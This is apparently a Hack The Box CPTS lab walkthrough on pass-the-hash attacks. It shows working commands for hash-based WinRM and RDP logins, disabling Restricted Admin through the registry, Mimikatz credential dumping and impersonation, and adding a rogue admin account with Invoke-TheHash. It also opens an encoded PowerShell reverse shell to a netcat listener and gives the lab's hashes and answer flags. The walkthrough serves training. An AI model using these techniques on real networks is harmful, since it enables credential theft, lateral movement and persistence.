### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Pass The Hash (PtH) <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.204.23

Authenticate to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453"

---

### Question 1:
Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

We can use evil-winrm to authenticate a shell:
```diff
+ $ evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

	Evil-WinRM shell v3.5
	
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	
	Info: Establishing connection to remote endpoint
```diff
+ *Evil-WinRM* PS C:\> type pth.txt
```

	G3t_4CCE$$_V1@_PTH

🚩 found **G3t_4CC--edit--E$$_V1@_PTH**.

---

### Question 2:
Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

Firstly, we need to use our current winrm shell to screw around with the registry, which always works flawlessly and never creates problems:
```diff
+ *Evil-WinRM* PS C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

	The operation completed successfully.

Sweet, glad we weren't gambling with our own OS there.

Now just auth through xfreerdp with the -pth flag:
```diff
+ $ xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

🚩 found **DisableRestrictedAdmin**.

---

### Question 3:
Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

This will be cake because we are already admin, and already have mimikatz on the win box. Make sure your cmd is running with admin privs, then execute mimikatz:
```diff
+ mimikatz # privilege::debug
```

	Privilege '20' OK
```diff
+ mimikatz # sekurlsa::logonpasswords
```

You can scrub through output manually or paste it in a text editor and search for 'david'.

🚩 found **c39f2beb3d2ec06a62cb887fb391dee0**.

---

### Question 4:
Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

Open a new admin cmd, run mimikatz pth:
```diff
+ c:\tools>mimikatz.exe privilege::debug "sekurlsa::pth /user:David /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

	mimikatz(commandline) # privilege::debug
	Privilege '20' OK
	
	mimikatz(commandline) # sekurlsa::pth /user:David /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe
	user    : David
	domain  : inlanefreight.htb
	program : cmd.exe
	impers. : no
	NTLM    : c39f2beb3d2ec06a62cb887fb391dee0
	  |  PID  2492
	  |  TID  4696
	  |  LSA Process is now R/W
	  |  LUID 0 ; 1580324 (00000000:00181d24)
	  \_ msv1_0   - data copy @ 00000272AF3E6090 : OK !
	  \_ kerberos - data copy @ 00000272AF52C9E8
	   \_ aes256_hmac       -> null
	   \_ aes128_hmac       -> null
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 00000272AF535CB8 (32) -> null

Now a new shell will appear. Type the share on the domain controller:
```diff
+ C:\Windows\system32>type \\DC01\david\david.txt
```

	D3V1d_Fl5g_is_Her3

🚩 found **D3V1d_Fl5g--edit--_is_Her3**.

---

### Question 5:
Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

We already dumped julio's hash earlier, hopefully you saved all that output in your reporting archive like a real pentester would have. So just load the appropriate creds into mimi one more time:
```diff
+ c:\tools>mimikatz.exe privilege::debug "sekurlsa::pth /user:Julio /ntlm:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now in the new window just read the file on the share:
```diff
+ C:\Windows\system32>type \\DC01\julio\julio.txt
```

	JuL1()_SH@re_fl@g

🚩 found **JuL1()_SH--edit--@re_fl@g**.

---

### Question 6:
Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

Start a listener on your ms01 host, in PS:
```diff
+ PS c:\tools> nc -nlvp 9999
```

	listening on [any] 9999 ...

Now grab that box's ip to make a reverse shell:
```diff
+ c:\tools> ipconfig
```

	Ethernet adapter Ethernet1 2:
	
	   Connection-specific DNS Suffix  . :
	   Link-local IPv6 Address . . . . . : fe80::eda9:6e75:da9d:ae71%13
	   IPv4 Address. . . . . . . . . . . : 172.16.1.5
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 172.16.1.1
	
	Ethernet adapter Ethernet0:
	
	   Connection-specific DNS Suffix  . : .htb
	   IPv4 Address. . . . . . . . . . . : 10.129.204.23
	   Subnet Mask . . . . . . . . . . . : 255.255.0.0
	   Default Gateway . . . . . . . . . : 10.129.0.1

In this case we will be using the `Ethernet1 2` interface's IP. When an ip4 starts with 172, you can be pretty sure it's only accessible on a private internal subnet/segment, as opposed to a publicly routable ip. So that's probably the interface we want, because the page says the DC can only communicate with the ms01 host we're on.

Easy enough to use revshells.com, and after encoding the Powershell #3 payload to base64 we get our payload string.

Now open up a priv PS, go to the Invoke-TheHash folder in tools, and import the module:
```diff
+ PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

First create a local admin user on DC01 via SMBExec:
```diff
+ PS C:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.5 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

Now throw that payload in the Invoke-WMIExec command:
```diff
+ PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e cG93ZXJzaGVsbCAtbm9wIC1XI..."
```

We get a rev shell back on our other window, where we can now traverse to our final shiny flag:
```diff
+ PS C:\Windows\system32> type C:\julio\flag.txt
```

	JuL1()_N3w_fl@g

🚩 found **JuL1()_N3--edit--w_fl@g**.
